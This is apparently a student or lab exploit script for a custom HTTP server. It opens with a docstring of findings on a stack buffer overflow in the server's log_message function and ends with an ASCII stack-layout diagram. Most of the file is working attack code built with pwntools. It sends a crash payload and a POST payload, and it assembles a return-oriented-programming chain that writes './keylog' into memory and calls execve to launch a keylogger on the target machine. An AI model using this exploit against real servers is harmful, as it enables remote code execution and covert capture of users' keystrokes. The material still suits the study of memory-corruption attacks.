'''
[FINDINGS]
General flow:
1) Sent request
2) handle_client: Receives the whole request and sends the response back to the client using its file descriptor after rest of processing
3) parse_request: Parses the request in arg:request_buf, logs only (!!) the request header, receives any remaining body data, 
                  executes the request, and builds a response in arg:response_buf
4) log_message: Logs arg:message to stdout and to a file

In the handle_client function a space of 0x500018 is allocated on the stack in comparison to 0x518 in scenario 1.
So we have space for approx 5114 KB instead of the previous 1 KB which offers us enough space to also store the keylogger.
This space is mostly used for the request_buffer of parse_request which is 0x4fffff big.

Next the goal is the same as in scenario 1, crash the server so N = 1 again and next sent the payload to run the keylogger,
but now we also need to sent the keylogger first and execute this keylogger which is now located on the stack in the space
from previous alinea.

To do this we don't put the keylogger inside the stack frame of log_message but just append it to the payload
after the spot to place the return address to the shellcode and reference the start of the keylogger
in that shell code. Now we just execute this binary which is now located on the stack.
'''

from keystone import *
from pwn import *
from struct import pack

### CONFIGS ###
host = "192.168.152.130"
port = 8080 
og_buffer_address = 0x7ffff75cf2d1
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer

### FUNCTIONS ###
def get_buffer_address():
    with open('./scenario_4/data.txt', 'rb') as f:
        stack_data = f.read()

    # Function to check if a value is likely a valid address (e.g., in the range of typical stack addresses)
    def is_valid_address(address):
        # For a 64-bit system, typical stack addresses start with 0x7f or 0x7e
        return address >= 0x7e0000000000 and address <= 0x7fffffffffff

    # Extract potential addresses from the stack data
    def extract_addresses(data):
        for i in range(0, len(data) - 8 + 1, 8):  # Assuming 8-byte (64-bit) addresses
            chunk = data[i:i+8]
            if len(chunk) == 8:
                address = struct.unpack('<Q', chunk)[0]  # Unpack as little-endian 64-bit unsigned long
                if is_valid_address(address):
                    return address

    # Extract and print the addresses
    address = extract_addresses(stack_data)
    print(hex(address))

### PAYLOAD ###
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)

### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"

### CREATE THE POST PAYLOAD ###
text = b"AAAAAAAA"
post_exploit = b"POST /data.txt HTTP/1.1\r\n"
post_exploit += b"Content-Length: 100000 \r\n"
post_exploit += b"\r\n"  
post_exploit += text

### CREATE THE ROPCHAIN ATTACK  ###

def create_ropchain_attack(buffer_address):
    offset = og_buffer_address - buffer_address
    keylogger_name = b'./keylog'

    p = b''
    p += pack('<Q', 0x00000000004036da - offset) # pop rdx ; pop rax ; ret  
    p += pack('<Q', 0x0000000000406230 - offset) # @ .data
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x00000000004036db - offset) # pop rax ; ret
    p += keylogger_name
    p += pack('<Q', 0x00000000004036d6 - offset) # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', 0x00000000004036da - offset) # pop rdx ; pop rax ; ret  
    p += pack('<Q', 0x0000000000406238 - offset) # @ .data + 8
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x00000000004036dd - offset) # xor rax, rax ; ret       
    p += pack('<Q', 0x00000000004036d6 - offset) # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', 0x000000000040398b - offset) # pop rdi ; ret
    p += pack('<Q', 0x0000000000406230 - offset) # @ .data
    p += pack('<Q', 0x00000000004028ac - offset) # pop rsi ; pop rbp ; ret  
    p += pack('<Q', 0x0000000000406238 - offset) # @ .data + 8
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x00000000004036da - offset) # pop rdx ; pop rax ; ret  
    p += pack('<Q', 0x0000000000406238 - offset) # @ .data + 8
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x00000000004036dd - offset) # xor rax, rax ; ret       
    p += pack('<Q', 0x00000000004036db - offset) # pop rax ; ret
    p += pack("<Q", 0x000000000000003b - offset) # syscall number (59) for rax
    p += pack("<Q", 0x00000000004036fb - offset) # syscall

    rop_exploit = message_prefix
    padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - message_prefix_len
    rop_exploit += b"q" * padding_size
    rop_exploit += p
    rop_exploit += b"\r\n\r\n"

    return rop_exploit


### PERFORM ATTACK ###

remote(host, port).send(post_exploit)
# input("Download the data.txt file from the server and upload the keylogger. Press any key to continue...")
# buffer_address = get_buffer_address()
# rop_exploit = create_ropchain_attack(buffer_address)
# remote(host, port).send(rop_exploit)

# Read the stack data from the file





# details for 'payload_rsp_offset':
#
# stack representation after return to the injected shell code:
#
#                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
#                                         |            |                         |
#                                         ||<---0x10-->|<---------0x450--------->|
# stack: <high addresses> =|======<1>======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
#                          |               |           |<5>|=========<4>=========|
#                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
#                                          |                       |<-24->|<-49->|
#                                          |<--payload_rsp_offset->|
#                                                                  └> start of injected payload
# Legend:
#   <1>: caller stack frame
#   <2>: spilled rbp of the caller
#   <3>: log_message stack frame
#   <4>: vulnerable buffer
#   <5>: other local variables   -> 5 VARS so 0x20 big
#   <6>: injected payload
#   <7>: "GET /data.txt HTTP/1.1\r\n"
#   <8>: "== Request from..."